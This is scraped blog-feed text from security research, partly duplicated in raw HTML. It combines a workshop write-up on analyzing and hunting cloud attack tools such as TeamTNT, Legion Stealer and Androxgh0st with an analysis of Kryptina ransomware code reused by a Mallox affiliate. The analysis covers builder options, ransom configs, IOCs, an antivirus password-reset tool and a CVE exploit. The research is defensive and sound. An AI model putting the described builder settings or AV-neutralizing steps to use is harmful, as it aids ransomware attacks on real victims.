These are less distinct from threats targeting any other attack surface, including:\nCryptomining\nSpamming\nData theft\nEspionage\nExtortion\nDisruption, attacks on availability\nCloud threat delivery and installation is also different. Actors frequently rely on web application or SaaS misconfigurations that enable access to resources that should be restricted.\nExamples of this include exposed environment files–a very common occurrence in Laravel implementation–as well as exposed Jenkins instances. Exploitation of unpatched security vulnerabilities is perennially popular given the high prevalence of web frameworks running in cloud services.\nCredential exposure is a huge problem: organizations often unknowingly upload service credentials to publicly accessible code sharing services like Docker Hub, GitHub, or Pastebin, as outlined in a recent post by Cybenari, which explores how long it takes for actors to identify and use the credentials.\nMy colleagues at SentinelOne recently published an excellent summary of the most commonly leveraged cloud threat vectors, which complimented this workshop’s focus.\nCloud Malware Taxonomy & Analysis\nTaxonomy in the cloud can be difficult because many tools are based on full source code and actors often take a feature from one tool and roll it into another one. This makes attribution complicated, if not challenging. Because these tools are not deployed on the victim machine and are run on the attacker’s system, it can be unclear which tool used the code first.\nCloud researchers often obtain samples from sources like VirusTotal, Pastebin, or from cybercriminal forums or Telegram channels. Unlike threats that target endpoints, which typically drop binaries or scripts that run in memory, threats running against cloud services leave only logs showing which APIs were called and in which order. While these can be valuable indicators for detection, they leave much to be desired in the way of seeing how actors implement their tooling.\nAnalyzing cloud tools can be complex because some scripts are very large. I have analyzed several scripts with more than 10,000 lines of code. To make this task more manageable, researchers can take several approaches.\nOne of my preferred methods is to perform a word frequency analysis that eliminates terms commonly used by the programming language of the script, revealing terms that are used highly frequently or infrequently. These outliers can provide strategic analytic starting points by highlighting terms that the tool focuses on, such as APIs, technologies, or credential categories.\nI use a Python script designed to analyze Python files for the occurrence of each term. The script reads the contents of the target file, filters out common terms used by the Python programming language, and writes output showing how many times each remaining term occurs.\nRunning this script against a modified version of Legion Stealer attributed to actor CobraEgy was quite helpful in reducing the volume of noise. The CobraEgy script contains more than 21,000 lines of Python code–a very daunting analysis task. The word frequency analysis script gave 3400 lines of words and the frequency they occurred. While this is still large, it’s easy to scroll through the results and find interesting terms.\nIn the following output, around line 40 there are many terms that show the tool capabilities likely include spamming (mailuser, mailport, mailfrom, host, get_smtp, smtp_login), web server activity (apache), and cloud service activity (aws_reg, aws_key).\nWord frequency analysis output from CobraEgy tool\nOnce you identify potentially interesting functionality, you can analyze those features. In the workshop,  participants were able to dive into commonly referenced cloud tool terms, such as aws, azure, profile, admin, password, server, host, username, and port.\nLooking at how these terms are used can provide insight into the tool’s capability and even yield valuable indicators of compromise that can be used to categorize the tool or an actor’s campaign. This approach is helpful when looking at many scripts at once, as you can run it as a grep command against an entire directory:\n\r\ngrep -RinE --include=\\*.{py,sh} '\\b(aws|azure|profile|admin|password|server|host|username|port)\\b' /path/to/search\r\n\nFor simplicity, I asked students to run against only one of the malicious scripts. The following results from a TeamTNT shell script revealed interesting clues to the tool’s capability, such as credential files, cloud service provider capabilities, and hardcoded credentials to connect to an external server.\nKeyword search against TeamTNT shell script\nResearchers can then cross-reference the search results against the original script, revealing its functionality. In this case, the azure.json hit was part of a larger credential file targeting list. The hardcoded username and password were used to connect to a C2 server to upload the data harvested from the system.\nCredential files targeted by TeamTNT shell script\nFunction used to send data to the C2 server\nWe also took a high level look at a Docker container that was used in TeamTNT’s 2023 SilentBob campaign. Docker containers are composed of layers: the container’s operating system is in the first layer, while subsequent layers are generated by instructions in the Dockerfile.\nDocker Desktop is a free tool that provides a nice interface for high-level analysis of a container’s features. Researchers can select the Docker image on the Images tab, then look at the layers. In the case of this container used by TeamTNT, there are 9 layers. Several layers have a command, which is shown on the Command pane.\nDocker layer showing tool installation commands\nThe container used in this attack is initialized, then downloads zgrab, a network scanning utility that TeamTNT uses to identify new systems to infect. Next, the container installs several utilities:\ntor: a binary that enables routing requests through the Tor anonymization network\ncurl, wget: utilities for creating HTTP requests\nlibproxychains3: enables routing connections through proxy servers for anonymity\nmasscan: network scanning utility used to identify new targets\nThese tools are used for identifying new victims and propagating the actor’s tools. The container also extracts several files from the base image, which are saved locally to the /usr/bin path and given read, write, and execute permissions. Researchers can mount the image–which I recommend doing in an isolated malware analysis environment–and copy the files to the local system for analysis.\nHunting in the Cloud\nThe workshop concluded by summarizing which artifacts from cloud tools can be hunted, as well as two types of hunting approaches: targeted and wide.\nA targeted hunting approach searches for specific indicators that are unique to a cloud threat family, such as Androxgh0st, FBot, or TeamTNT tools. For example, the following Androxgh0st strings are from unique variables recycled across many tools, including AlienFox:\nTargeted VirusTotal Livehunt rule searching for Androxgh0st strings\nIn the following example from FBot, the tool makes requests to a Lithuanian fashion designer’s website–robertkalinkin[.]com–to validate Paypal accounts. Interestingly, this Paypal validator is also used by other cloud attack tools, including Legion Stealer.\nDue to the Python code containing special characters that escape the string, I opted to use the hexadecimal equivalent of the variable and its contents, as shown in the comment below.\nTargeted VirusTotal Livehunt rule searching for a Paypal validator URL\nThe wide hunting approach looks for behavior, so researchers can identify new malware families conducting specific activities. Wide hunting rules that I have written search for scripts on VirusTotal that exhibit sets of behaviors, like references to Kubernetes and binaries associated with downloading additional payloads, such as wget. The rule also filters for script file types, which are more likely to be associated with cloud attack tools.\nWide VirusTotal Livehunt rule searching for terms related to Kubernetes and download activity\nAnother wide hunting rule looks for references to popular cloud service providers (CSP) and URLs for Telegram channels. This combination indicates that the tool is conducting suspicious behavior by nature of using Telegram and that it is cloud focused by referencing a CSP. Wide hunting rules often generate much noise, and the CSP Telegram rule was no exception.\nTo minimize noise from files referencing the Dawson Creek time zone in British Columbia, I added the $negate1 variable, which excludes results when the Dawson string is referenced.\nWide VirusTotal Livehunt rule searching for references to CSPs and Telegram\nConclusion\nIn this workshop at LABScon24, I provided aspiring cloud researchers with several approaches that they can use as an entry point into cloud threat research and hunting. Using the Word Frequency Analysis approach is extremely helpful for analyzing huge scripts with thousands of lines of code. Similarly, the targeted keyword approach helps identify areas of a script that perform crucial cloud-centric activities. A similar approach could be used to identify CSP APIs when searching for a specific action. For investigations involving a container that is not running in a live environment, Docker Desktop remains a solid starting point to identify features of the container and to extract details that provide insight into the container’s capabilities.\nThreat hunting in the cloud is different from hunting binaries, as many malware researchers primarily do. The workshop outlined my approach to hunting several cloud threat families by using unique strings, such as Telegram handles or variable names, that frequently reoccur across these tools. The broad threat hunting approach can be noisy and time-consuming, but it has yielded many new findings that may have otherwise gone unseen.\nInterested in attending or presenting at LABScon25?

The keys and configuration data are obfuscated via XOR and then base64 encoded (the XOR key depends on the value set in the builder or scripts). The function <code>krptna_process_file()</code> function is responsible for the file encryption. This function is a typical implementation of file encryption/decryption using the AES-256-CBC algorithm in OpenSSL.</p>\n<p>This function initializes an OpenSSL cipher context <code>EVP_CIPHER_CTX_new()</code>. This is passed to the appropriate function, depending on what mode was chosen in the builder configuration (demo mode, etc). File input and output streams are processed via <code>EVP_CipherUpdate()</code>, which transforms unencrypted file data to the encrypted data in the output buffer. This is then written to the final output file (as the modified/encrypted file). <code>EVP_CipherFinal</code> finalizes the processes handling any padding (integral to CBC mode).</p>\n<p>All the legacy Kryptina code is included in the <code>/src</code> folder of the affiliates server, with the files themselves even retaining the Kryptina naming conventions and references to known functions (e.g., <code>krptna_process_file()</code>).&#8221;</div>\n<figure id=\"attachment_105864\" aria-describedby=\"caption-attachment-105864\" style=\"width: 658px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/09/Kryptina_Mallox_8.jpg\" alt=\"Kryptina-specific functions in Mallox Linux 1.0\" width=\"658\" height=\"335\" class=\"size-full wp-image-105864\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/09/Kryptina_Mallox_8.jpg 658w, https://www.sentinelone.com/wp-content/uploads/2024/09/Kryptina_Mallox_8-300x153.jpg 300w\" sizes=\"(max-width: 658px) 100vw, 658px\" /><figcaption id=\"caption-attachment-105864\" class=\"wp-caption-text\">Kryptina-specific functions in Mallox Linux 1.0</figcaption></figure>\n<p>With the exception of the aforementioned Kryptina database, the Kryptina branding has been stripped from most of the source and support files for “Mallox Linux 1.0”.</p>\n<figure id=\"attachment_105874\" aria-describedby=\"caption-attachment-105874\" style=\"width: 759px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/09/Kryptina_Mallox_25.jpg\" alt=\"Mallox Linux 1.0 “Documentation”\" width=\"759\" height=\"154\" class=\"size-full wp-image-105874\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/09/Kryptina_Mallox_25.jpg 759w, https://www.sentinelone.com/wp-content/uploads/2024/09/Kryptina_Mallox_25-300x61.jpg 300w\" sizes=\"(max-width: 759px) 100vw, 759px\" /><figcaption id=\"caption-attachment-105874\" class=\"wp-caption-text\">Mallox Linux 1.0 documentation</figcaption></figure>\n<p>Documentation for the Kryptina-derived Mallox variations is included, though it is a distilled version of the original Kryptina documentation.

At the time, Kryptina provided all the components required to host a fully functional RaaS platform. This included the ability to automate payloads, manage multiple groups and campaigns nested within, as well as configure the ransom payment requirements such as the amount and type of payment. Despite such functionality, the offering struggled to attract much interest from dark market customers.\nIn May 2024, an affiliate of the Mallox RaaS exposed one of their staging servers. As a result of this leak, we identified Kryptina RaaS to be the platform on which the affiliate’s Linux variants were based. The affiliate threat actor referred to this Linux variant as “Mallox v1.0”. This ‘evolution’ of Kryptina is notable in a rags-to-riches sort of way. In the span of a few months, the tool went from an unsellable give-away in public forums to being observed in active SMB/Enterprise attacks.\nIn this research, we explore the data exposed in the open directory leak, detailing differences between the original Kryptina RaaS (v2.2) and the modified version branded under the Mallox moniker.\nBrief History of Kryptina & Mallox\nMallox (aka TargetCompany) ransomware is a longstanding, Enterprise-focused, RaaS. The family emerged in 2021 and is sometimes referred to as FARGO, XOLLAM, or BOZON, due to the extension appended to encrypted files in some variants. Mallox operators are known to opportunistically target ‘timely’ vulnerabilities (e.g., MSSQL Server). Individual affiliate behavior will vary, though this style of exploitation, along with brute force attacks to establish initial access, is common across Mallox campaigns.\nKryptina was first offered for sale by the “Corlys” identity in December 2023. The price for the full suite, at the time, was $500.00, and later raised to $800.00. In February 2024, “Corlys” put a halt to the active sales of Kryptina, and subsequently posted the full source code to BreachForums.\nIn May, 2024, an open directory which contained staged payloads along with Mallox builder tools and source was discovered. This staging server was erected by a Mallox affiliate and hosts a number of attacker-related tools. \nFirst discovery of an open directory on Mallox affiliate server\nThe staging server, hosted on 185[.]73.125[.]6, contained numerous archives and payloads specific to the Windows version of Mallox. \nMallox staging server with web application and source\nHowever, the affiliate’s server also contained all the (modified) source files for Kryptina, including the accessible web server and interface for building Mallox Linux (Kryptina) payloads, and managing separate infection campaigns. \nKryptina source files in Mallox leak\nKryptina database in Mallox leak\nThe use of Kryptina by this affiliate appears to be singular: other Linux variants of Mallox are not based on Kryptina, further complicating the the relationship between Kryptina and Mallox.\nCustomizing Kryptina\nEncryption and decryption routines in “Mallox Linux 1.0” are identical to original Kryptina. To recap from our previous write-up:\n“Individual file encryption is achieved through use of AES256 in CBC mode. The keys and configuration data are obfuscated via XOR and then base64 encoded (the XOR key depends on the value set in the builder or scripts). The function krptna_process_file() function is responsible for the file encryption. This function is a typical implementation of file encryption/decryption using the AES-256-CBC algorithm in OpenSSL.\nThis function initializes an OpenSSL cipher context EVP_CIPHER_CTX_new(). This is passed to the appropriate function, depending on what mode was chosen in the builder configuration (demo mode, etc). File input and output streams are processed via EVP_CipherUpdate(), which transforms unencrypted file data to the encrypted data in the output buffer. This is then written to the final output file (as the modified/encrypted file). EVP_CipherFinal finalizes the processes handling any padding (integral to CBC mode).\nAll the legacy Kryptina code is included in the /src folder of the affiliates server, with the files themselves even retaining the Kryptina naming conventions and references to known functions (e.g., krptna_process_file()).”\nKryptina-specific functions in Mallox Linux 1.0\nWith the exception of the aforementioned Kryptina database, the Kryptina branding has been stripped from most of the source and support files for “Mallox Linux 1.0”.\nMallox Linux 1.0 documentation\nDocumentation for the Kryptina-derived Mallox variations is included, though it is a distilled version of the original Kryptina documentation. The original Kryptia PDF (SHA1: d46fbc4a57dce813574ee312001eaad0aa4e52de) has been slimmed down and included as docs.md. Included sections have been translated to Russian from the original English version.\nOriginal Kryptina RaaS documentation\nModified Mallox Linux 1.0 documentation\nThe updated Mallox Linux 1.0 documentation contains sections covering basic features, environmental setup (dependencies and version affinities), along with setup and configuration of phpMyAdmin and the backend DB (MySQL).\nMallox Linux 1.0 dependencies\nMallox Linux 1.0 DB (MySQL) configuration\nThe affiliate made a few changes to the Kryptina source files and scripts in order to remove references to Kryptina and associate the comments and naming conventions to those of Mallox.\nRansom note templates are structured similarly to the original Kryptina version. The \\note folder on the affiliate server contains the template source, which can be customized directly or via the Kryptina web UI. The template for the ransom note was updated to remove the Kryptina 2.x references, replacing them with Mallox v1.0.\nKryptina original ransom note template\nMallox 1.0 ransom note template\nThe main source files for “Mallox 1.0” were held in the /src folder of the affiliate server. The original names of the encryptor and decryptor source files (kryptina.c and kryptina.h) retain the Kryptina-centric names. The only operational change to the Kryptina encryptor code is the updating of printed output in Debug mode (updated to Mallox). Aside from changing comments in the file to reference Mallox, and removing references to the Kryptina author (“Corlys”), the source is unchanged.\nMallox 1.0 src, with KRPTNA_DEBUG printf ->Mallox\nOriginal Kryptina 2.2 kryptina.c source file\nMallox 1.0 kryptina.c source file\nKryptina’s original scripting_demo.py file provided threat actors with a way to build Linux payloads via the command line. All the requisite fields are provided in the template. This allows for quick and automated builds. While these scripted builds are not reflected in the web UI, it can be a valuable tool to a threat actor wanting to streamline the automation of new builds over time. The scripting_demo.py file has been minimally updated, again to reflect Mallox branding over Kryptina. References to “Corlys” have been removed as well.\nOriginal Kryptina scripting_demo.py source file\nMallox 1.0 scripting_demo.py source file\nComparing Kryptina and Mallox makefiles\nThe makefile is used when building encryptor and decryptor payloads. This can be called directly via script, or via the web UI while building payloads within campaigns.\nKryptina (and subsequently Mallox 1.0) supports multiple modes within the compiled payloads. These are:\ndemo – builds a demo version of Kryptina, no encryption\ndebug – provides customized debug output\nsymbols – provides debug build with debug symbols (-ggdb3)\narch32 – output 32-bit payload\nAdditional parameter values are provided for other conditions present in the builder. This includes the ability to customize the XOR key use for encoding the encrypted configuration data within payloads (xor), thread count to use during the encryption process (jobs), toggling of the self deletion feature (persist), and filesize constraints (maxsize) to enforce during encryption (e.g., maximum size of file to attempt to decrypt). Secure deletion (wiper’esque capability) can be toggled via the secdel parameter. \nExample makefiles from the original Kryptina package and the Mallox-modified package appear as follows:\nKryptina makefile\nMallox Linux 1.0 makefile\nVictim Subfolders\nThe May 2024 affiliate leak also contained target-specific output folders for 14 targets (potential victims). Some of this information was previously detailed here.\nIn the \\output folder, subfolders exist for each target (unique ‘Target Name’ value).\nOutput folder on affiliate staging server\nSome of these folders contain config.json files (builder configuration) alongside the matching encryptor/decryptor binary pairs. There are empty folders as well, meaning those targets were defined, but payloads have yet to be built.\nAffiliate output directory with payloads and configs\nEach of the config files contains values for all the fields required in the builder scripts. This includes payment type and addresses. The configuration JSON contains values for the following:\nabout\namount\narch32\nbitcoin\ndeadline\n\n\ndebug\ndemo\nextension\nignore\niv\n\n\njobs\nkey\nmaxsize\nmonero\nname\n\n\nnolog\nnonote\nnote\nnote_name\npersist\n\n\nrecommend\nsecdel\nsession\nstatic\nsymbols\n\n\ntarget_id\ntargets\ntox\nverbose\nxor_key\n\n\n\n\nExample config.json\nSeven of the victim subfolders contained corresponding config.json files and compiled encryptor & decryptor tools. All of the JSON files have similar values assigned for the requisite field. All of the targets were configured with the same payment address (BTC 18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3). Other requisite values are repeated across campaigns as well. This includes the values for “key”, “bitcoin” and “extension”. The extension on all fully-configured builds (potentially separate attack campaigns) is .lmallox.\nSHA1 Hash\nBitcoin\nExtension\nKey\nAmount\n\n\nfbb89744bc9f65719bd5415dcf1ec9a74b24254e\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3\n.lmallox\nsmHKnqN7S1ehBz4zxya6ddwys39PJHbF7LlqIS1+Fq4=\n500.0\n\n\n55dc4541b72a804a7edf324d6a388569a68a2986\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3\n.lmallox\nsmHKnqN7S1ehBz4zxya6ddwys39PJHbF7LlqIS1+Fq4=\n500.0\n\n\n78c27c7ac1da97dc822b4af7be5f15d68f9c5e4f\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3\n.lmallox\nsmHKnqN7S1ehBz4zxya6ddwys39PJHbF7LlqIS1+Fq4=\n500.0\n\n\nd94f890a8c92cbce50d89da2792bcfc24894c004\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3\n.lmallox\nsmHKnqN7S1ehBz4zxya6ddwys39PJHbF7LlqIS1+Fq4=\n500.0\n\n\n16ec82ac2caf0c2e4812a636dbff4bd8ef84d5c3\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3\n.lmallox\nsmHKnqN7S1ehBz4zxya6ddwys39PJHbF7LlqIS1+Fq4=\n500.0\n\n\n66cab82b64fbb03fecf7ca7f9ed295404a9bfe2b\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3\n.lmallox\nsmHKnqN7S1ehBz4zxya6ddwys39PJHbF7LlqIS1+Fq4=\n500.0\n\n\n0bbd9a8ddbb68e2658ea4c0a4106c7406a392098\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3\n.lmallox\nsmHKnqN7S1ehBz4zxya6ddwys39PJHbF7LlqIS1+Fq4=\n500.0\n\n\n\n\nThe configuration files also contain the full text template for the ransom notes, with associated Client IDs, and additional communication channels. \n\r\nTox ID: 290E6890D02FBDCD92659056F9A95D80854534A4D76EE5D3A64AFD55E584EA398722EC2D3697)\r\n\nWhat Else Was Leaked?\nThe tools identified on the affiliate server were not limited to Linux victims. A small cache of tools and exploits which target the Windows platform were also hosted. These are utilized by the threat actor in the early stages of attack, primarily for beachhead establishment and privilege escalation.\nWindows-focused droppers and tools on affiliate leak site\nKLAPR.ZIP extracts to KLAPR.BAT (SHA1:43377911601247920dc15e9b22eda4c57cb9e743). This tool is provided by the affiliate to assist in the neutralization of Kaspersky endpoint products where needed. This binary is a copy of the “Kaspersky Lab AllProducts Password Reset v2.0” tool. This is a legitimate support tool from Kaspersky Labs. Specific security products from Kaspersky require an application-specific password to allow for changing of configuration settings (locally) or other management tasks. This .BAT file resets (nullifies) the stored password values for a multitude of Kaspersky products.\nExploit code for CVE-2024-21338 is included as well. CVE-2024-21338 is a local privilege escalation flaw in Windows 10 and 11 where HVCI (Hypervisor-Protected Code Integrity) is enabled. This exploit is based on the proof-of-concept code provided in a writeup from Hakai Security. The same code is also hosted on the hakaioffsec GitHub repository.\nCVE-2024-21338 Exploit Readme\nCVE-2024-21338 has been associated with other Mallox campaigns, as well as Lazarus.\nMultiple droppers for Mallox (Windows) are included, including a commented s.ps1 PowerShell script. This script, hosted at the root of the open directory, provides a template for PowerShell privilege escalation and payload execution. Some basic environmental discovery commands are included (e.g., Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct).\ns.ps1 script from Mallox affiliate leak\nA Mallox (Windows) dropper named Application.jar (SHA1: 5cf67c0a1fa06101232437bee5111fefcd8e2df4) was also present. This dropper launches a PowerShell script that downloads a copy of Mallox from the same server (as id.exe; SHA1: 0f1aea2cf0c9f2de55d2b920618a5948c5e5e119). The PowerShell commands are embedded within the nested MyClass.class as Java bytecode. MyClass.class contains reference to a temporary DNS resolution for the host at grovik71.theweb[.]place.\nDNS name revealed (grovik71.theweb[.]place)\nA copy of the Java JRE (8.0.4010.10) is hosted on the affiliate server.

Looking forward, we expect to see more outlier platforms like Kryptina being absorbed into the TTPs leveraged by more advanced threat actors.\nIOCs\nFiles SHA1\nNetwork Comms\nTox ID\nBTC Address\n18CUq89XR81Y7Ju2UBjER14fYWTfVwpGP3","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2024/09/Kryptina-Desert-Ftr.jpg","length":"802915","type":"image/jpeg"},"dc:creator":"Jim Walter","content":"Kryptina's adoption by Mallox affiliates complicates malware tracking as ransomware operators blend different codebases into new variants.","contentSnippet":"Kryptina's adoption by Mallox affiliates complicates malware tracking as ransomware operators blend different codebases into new variants.","guid":"https://www.sentinelone.com/?post_type=labs&p=105715","categories":["Ransomware"],"isoDate":"2024-09-23T10:00:00.000Z","tag":"intel"},{"creator":"LABScon","title":"LABScon23 Replay | They Spilled Oil in My Health-Boosting Smoothie","link":"https://www.sentinelone.com/labs/labscon23-replay-they-spilled-oil-in-my-health-boosting-smoothie/","pubDate":"Thu, 05 Sep 2024 15:25:14 +0000","content:encoded":"<p>OilRig is a well-known Iran-aligned cyberespionage group, allegedly under the MOIS (Ministry of Intelligence and Security), that has been targeting Middle Eastern governments and a variety of business verticals since at least 2014.
